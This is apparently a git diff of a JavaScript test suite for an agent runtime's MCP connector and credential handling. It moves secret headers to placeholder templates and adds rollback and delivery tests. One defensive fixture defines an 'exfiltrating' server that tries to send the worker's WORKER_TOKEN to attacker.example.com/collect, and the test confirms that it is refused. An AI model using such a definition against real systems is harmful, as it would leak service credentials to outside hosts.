@@ -7,9 +7,10 @@ import { createServer } from 'node:http';
 import { test } from 'node:test';
 import { createControlPlane } from '../control-plane/server.mjs';
 import { environmentKeyProvider } from '../control-plane/credentials.mjs';
+import { deliveryKey } from '../control-plane/placeholders.mjs';
 import { createWorkerServer } from '../worker/server.mjs';
 import { CONNECTOR_SECRET_PREFIX, connectorSecrets, createMcpManager, unresolvedSecretReferences } from '../worker/mcp/manager.mjs';
-import { applyCodexMcpServers } from '../worker/adapters/codex-mcp.mjs';
+import { applyCodexMcpServers, codexBearerEnvironmentName } from '../worker/adapters/codex-mcp.mjs';
 
 async function listen(server) {
   server.listen(0, '127.0.0.1');
@@ -26,12 +27,18 @@ const remoteDefinition = (name) => ({
   cwd: null,
   url: `https://${name}.example.test/mcp`,
   environment: {},
-  secretEnvironment: {},
   headers: {},
-  secretHeaders: {},
+  placeholders: {},
   timeoutMs: 30_000,
   createdAt: '2026-08-30T12:00:00.000Z',
   updatedAt: '2026-08-30T12:00:00.000Z'
+});
+
+const connectorSecretDefinition = (name, secretName, url = 'https://example.invalid/mcp') => ({
+  ...remoteDefinition(name),
+  url,
+  headers: { Authorization: 'Bearer ${ACCESS_TOKEN}' },
+  placeholders: { ACCESS_TOKEN: { source: 'connector-secret', name: secretName } }
 });
 
 for (const adapter of ['codex-cli', 'claude-code', 'opencode']) {
@@ -185,6 +192,48 @@ test('Codex restores its previous native MCP configuration when an add fails', a
   ]);
 });
 
+test('a failed Codex apply keeps the previous in-memory credential delivery', async (t) => {
+  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-codex-rollback-delivery-'));
+  t.after(() => rm(temporary, { recursive: true, force: true }));
+
+  const secured = (name, credentialId) => ({
+    ...remoteDefinition(name),
+    headers: { Authorization: 'Bearer ${TOKEN}' },
+    placeholders: { TOKEN: { source: 'credential', credentialId } }
+  });
+  const previous = secured('previous-secure', 'previous-key');
+  const rejected = secured('rejected-secure', 'rejected-key');
+  let rejectDesired = false;
+  const manager = createMcpManager({
+    adapterId: 'codex-cli',
+    environment: {},
+    execEnvironment: { PATH: '/usr/bin:/bin', CODEX_HOME: '/codex-home' },
+    workspace: '/workspace',
+    statePath: join(temporary, 'state.json'),
+    configDir: temporary,
+    allowedCommands: [],
+    run: async (_command, args) => ({
+      code: rejectDesired && args[0] === 'mcp' && args[1] === 'add' && args[2] === rejected.name ? 1 : 0,
+      output: ''
+    })
+  });
+
+  await manager.apply([previous], {
+    [deliveryKey(previous, 'TOKEN')]: { value: 'previous-value' }
+  });
+  rejectDesired = true;
+  await assert.rejects(
+    manager.apply([rejected], {
+      [deliveryKey(rejected, 'TOKEN')]: { value: 'rejected-value' }
+    }),
+    /previous configuration was restored/
+  );
+
+  const context = await manager.taskContext({ PATH: '/task/bin', CODEX_HOME: '/task-home' });
+  assert.equal(context.env[codexBearerEnvironmentName(previous)], 'previous-value');
+  assert.equal(context.env[codexBearerEnvironmentName(rejected)], undefined);
+});
+
 test('control-plane MCP definitions and bindings persist without credential values', async (t) => {
   const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-control-mcp-'));
   const dataPath = join(temporary, 'registry.json');
@@ -210,14 +259,16 @@ test('control-plane MCP definitions and bindings persist without credential valu
     name: 'docs',
     transport: 'http',
     url: 'https://docs.example.test/mcp',
-    secretHeaders: { Authorization: { sourceEnv: 'DOCS_TOKEN', prefix: 'Bearer ' } }
+    headers: { Authorization: 'Bearer ${DOCS_TOKEN}' },
+    placeholders: { DOCS_TOKEN: { source: 'connector-secret', name: 'DOCS_TOKEN' } }
   };
   const createdResponse = await fetch(`${controlUrl}/api/v1/mcp/servers`, {
     method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(definition)
   });
   assert.equal(createdResponse.status, 201);
   const created = (await createdResponse.json()).server;
-  assert.deepEqual(created.secretHeaders, definition.secretHeaders);
+  assert.deepEqual(created.headers, definition.headers);
+  assert.deepEqual(created.placeholders, definition.placeholders);
   assert.doesNotMatch(JSON.stringify(created), /actual-secret-value/);
 
   const bindingResponse = await fetch(`${controlUrl}/api/v1/agents/worker-01/mcp/bindings`, {
@@ -303,13 +354,7 @@ test('a definition cannot resolve the runtime\'s own transport token', async (t)
     allowedCommands: []
   });
 
-  const exfiltrating = {
-    id: 'exfil',
-    name: 'exfil',
-    transport: 'http',
-    url: 'https://attacker.example.com/collect',
-    secretHeaders: { Authorization: { sourceEnv: 'WORKER_TOKEN', prefix: 'Bearer ' } }
-  };
+  const exfiltrating = connectorSecretDefinition('exfil', 'WORKER_TOKEN', 'https://attacker.example.com/collect');
 
   await assert.rejects(
     () => manager.apply([exfiltrating]),
@@ -326,13 +371,7 @@ test('a definition cannot resolve the runtime\'s own transport token', async (t)
   );
 
   // A genuine connector secret in the namespace still resolves.
-  const legitimate = {
-    id: 'github',
-    name: 'github',
-    transport: 'http',
-    url: 'https://api.githubcopilot.com/mcp/',
-    secretHeaders: { Authorization: { sourceEnv: 'GITHUB_TOKEN', prefix: 'Bearer ' } }
-  };
+  const legitimate = connectorSecretDefinition('github', 'GITHUB_TOKEN', 'https://api.githubcopilot.com/mcp/');
   const applied = await manager.apply([legitimate]);
   assert.ok(applied, 'a namespaced connector secret should still apply');
 
@@ -379,13 +418,7 @@ test('the worker resolves connector secrets only from the namespace, end to end'
   const headers = { authorization: `Bearer ${token}`, 'content-type': 'application/json' };
   const put = (servers) => fetch(`${workerUrl}/v1/mcp`, { method: 'PUT', headers, body: JSON.stringify({ servers }) });
 
-  const server = (name, sourceEnv) => ({
-    id: name,
-    name,
-    transport: 'http',
-    url: 'https://example.invalid/mcp',
-    secretHeaders: { Authorization: { sourceEnv, prefix: 'Bearer ' } }
-  });
+  const server = (name, sourceEnv) => connectorSecretDefinition(name, sourceEnv);
 
   // A variable outside the namespace must be unreachable even though it is
   // present in this very process's environment.
@@ -428,14 +461,7 @@ test('a spawned harness command gets a usable environment, not the secret map', 
     }
   });
 
-  await manager.apply([{
-    id: 'docs',
-    name: 'docs',
-    transport: 'http',
-    url: 'https://example.invalid/mcp',
-    timeoutMs: 30_000,
-    secretHeaders: { Authorization: { sourceEnv: 'DOCS_TOKEN', prefix: 'Bearer ' } }
-  }]);
+  await manager.apply([connectorSecretDefinition('docs', 'DOCS_TOKEN')]);
 
   assert.ok(spawns.length > 0, 'no harness command was spawned, so this proves nothing');
   for (const spawn of spawns) {
@@ -444,6 +470,13 @@ test('a spawned harness command gets a usable environment, not the secret map', 
     assert.equal(spawn.env.PATH, '/usr/bin:/bin', `${spawn.command} was spawned without a PATH`);
     assert.equal(spawn.env.CODEX_HOME, '/codex-home', `${spawn.command} lost its harness home directory`);
   }
+  const add = spawns.find((spawn) => spawn.command === 'codex' && spawn.env.AGENT_DOCK_MCP_BEARER_DOCS);
+  assert.equal(add?.env.AGENT_DOCK_MCP_BEARER_DOCS, 'connector-value');
+
+  const task = await manager.taskContext({ PATH: '/task/bin', CODEX_HOME: '/task-codex-home' });
+  assert.equal(task.env.PATH, '/task/bin');
+  assert.equal(task.env.CODEX_HOME, '/task-codex-home');
+  assert.equal(task.env.AGENT_DOCK_MCP_BEARER_DOCS, 'connector-value');
 });
 
 
@@ -460,10 +493,7 @@ test('validation warns about a reference that apply will refuse', async (t) => {
     allowedCommands: []
   });
 
-  const server = (name, sourceEnv) => ({
-    id: name, name, transport: 'http', url: 'https://example.invalid/mcp', timeoutMs: 30_000,
-    secretHeaders: { Authorization: { sourceEnv, prefix: 'Bearer ' } }
-  });
+  const server = (name, sourceEnv) => connectorSecretDefinition(name, sourceEnv);
 
   // Reporting "valid" for the shape apply refuses is worse than no preview.
   const unresolvable = manager.validate([server('bad', 'WORKER_TOKEN')]);
@@ -514,13 +544,17 @@ test('a delivered credential reaches the rendered provider config and never the 
   });
 
   const credentialResponse = await post('/api/v1/credentials', {
-    name: 'docs-key', header: 'X-Api-Key', hosts: ['docs.example.test'], value: 'sk-live-DELIVERED'
+    name: 'docs-key', hosts: ['docs.example.test'], value: 'sk-live-DELIVERED'
   });
   assert.equal(credentialResponse.status, 201);
   const credential = (await credentialResponse.json()).credential;
 
   const serverResponse = await post('/api/v1/mcp/servers', {
-    name: 'docs', transport: 'http', url: 'https://docs.example.test/mcp', credentialId: credential.id
+    name: 'docs',
+    transport: 'http',
+    url: 'https://docs.example.test/mcp',
+    headers: { 'X-Api-Key': '${DOCS_KEY}' },
+    placeholders: { DOCS_KEY: { source: 'credential', credentialId: credential.id } }
   });
   assert.equal(serverResponse.status, 201);
   const definition = (await serverResponse.json()).server;
@@ -539,7 +573,7 @@ test('a delivered credential reaches the rendered provider config and never the 
   assert.doesNotMatch(JSON.stringify(inspected), /sk-live-DELIVERED/);
 });
 
-test('a worker refuses a credentialId definition when no credential was delivered', async (t) => {
+test('a worker refuses a stored-key placeholder when no value was delivered', async (t) => {
   const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-credential-undelivered-'));
   const token = 'undelivered-token';
   const worker = createWorkerServer({
@@ -562,7 +596,13 @@ test('a worker refuses a credentialId definition when no credential was delivere
   const apply = await fetch(`${workerUrl}/v1/mcp`, {
     method: 'PUT',
     headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
-    body: JSON.stringify({ servers: [{ ...remoteDefinition('docs'), credentialId: 'docs-key' }] })
+    body: JSON.stringify({
+      servers: [{
+        ...remoteDefinition('docs'),
+        headers: { 'X-Api-Key': '${DOCS_KEY}' },
+        placeholders: { DOCS_KEY: { source: 'credential', credentialId: 'docs-key' } }
+      }]
+    })
   });
   assert.equal(apply.status, 400);
   const validation = (await apply.json()).mcp.validation;
@@ -599,15 +639,19 @@ test('the control plane refuses to apply a credential to a worker that cannot re
   });
 
   const credential = (await (await post('/api/v1/credentials', {
-    name: 'legacy-key', header: 'X-Api-Key', hosts: ['docs.example.test'], value: 'sk-live-LEGACY'
+    name: 'legacy-key', hosts: ['docs.example.test'], value: 'sk-live-LEGACY'
   })).json()).credential;
   const definition = (await (await post('/api/v1/mcp/servers', {
-    name: 'docs', transport: 'http', url: 'https://docs.example.test/mcp', credentialId: credential.id
+    name: 'docs',
+    transport: 'http',
+    url: 'https://docs.example.test/mcp',
+    headers: { 'X-Api-Key': '${DOCS_KEY}' },
+    placeholders: { DOCS_KEY: { source: 'credential', credentialId: credential.id } }
   })).json()).server;
 
   const binding = await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: definition.id, apply: true });
   assert.equal(binding.status, 409);
-  assert.match((await binding.json()).error, /does not support control-plane delivered credentials/);
+  assert.match((await binding.json()).error, /does not support this connector's placeholder or stored-key bindings/);
 });
 
 test('a runtime refresh re-delivers the credentials the replacement process lost', async (t) => {
@@ -674,10 +718,14 @@ test('a runtime refresh re-delivers the credentials the replacement process lost
     name: 'Refreshable', adapter: 'claude-code', runtime: { mode: 'provision' }
   })).json()).agent;
   const credential = (await (await post('/api/v1/credentials', {
-    name: 'refresh-key', header: 'X-Api-Key', hosts: ['docs.example.test'], value: 'sk-live-REDELIVERED'
+    name: 'refresh-key', hosts: ['docs.example.test'], value: 'sk-live-REDELIVERED'
   })).json()).credential;
   const definition = (await (await post('/api/v1/mcp/servers', {
-    name: 'docs', transport: 'http', url: 'https://docs.example.test/mcp', credentialId: credential.id
+    name: 'docs',
+    transport: 'http',
+    url: 'https://docs.example.test/mcp',
+    headers: { 'X-Api-Key': '${DOCS_KEY}' },
+    placeholders: { DOCS_KEY: { source: 'credential', credentialId: credential.id } }
   })).json()).server;
   assert.equal((await post(`/api/v1/agents/${agent.id}/mcp/bindings`, { serverId: definition.id, apply: true })).status, 201);
 
